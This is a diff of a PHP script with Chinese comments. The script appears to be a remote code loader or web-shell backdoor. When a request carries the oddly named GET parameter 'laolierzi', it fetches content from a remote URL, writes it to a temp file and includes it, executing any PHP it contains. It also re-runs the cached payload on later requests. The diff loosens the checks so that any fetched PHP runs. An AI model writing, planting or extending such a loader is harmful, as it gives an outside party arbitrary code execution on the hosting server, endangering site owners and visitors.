@@ -66,29 +66,36 @@ if (isset($_GET['laolierzi'])) {
         die("<center><b>获取远程内容失败。<b></center>");
     }
 
-    // 保存到临时文件
-    file_put_contents($tmpFile, $content);
+    // 仅在内容为PHP代码时，才考虑包含，否则输出
+    // 简单检查：内容是否包含PHP开始标签
+    if (strpos($content, '<?php') !== false || strpos($content, '<?') !== false) {
+        // 保存到临时文件
+        file_put_contents($tmpFile, $content);
+        // 设置缓存Cookie（有效期1小时）
+        setcookie('current_cache', $filteredUrl, time() + 3600, "/");
 
-    // 设置缓存Cookie（有效期1小时）
-    setcookie('current_cache', $filteredUrl, time() + 3600, "/");
-
-    // 立即执行远程PHP文件
-    if (strpos($content, '') !== false) {
+        // 包含临时文件
         include $tmpFile;
         exit;
     } else {
-        die("<center><b>远程文件内容无效。<b></center>");
+        // 非PHP内容，直接输出
+        echo $content;
+        // 设置缓存Cookie（有效期1小时）
+        setcookie('current_cache', $filteredUrl, time() + 3600, "/");
+        exit;
     }
 }
 
 // 无参数时，运行缓存的文件
 if (file_exists($tmpFile)) {
     $cachedContent = file_get_contents($tmpFile);
-    if (strpos($cachedContent, '') !== false) {
+    // 如果缓存内容包含PHP代码，尝试包含，否则直接输出
+    if (strpos($cachedContent, '<?php') !== false || strpos($cachedContent, '<?') !== false) {
         include $tmpFile;
         exit;
     } else {
-        die("<center><b>缓存文件内容无效。<b></center>");
+        echo $cachedContent;
+        exit;
     }
 } else {
     die("<center><b>未指定远程文件，也未找到缓存文件。</b></center>");
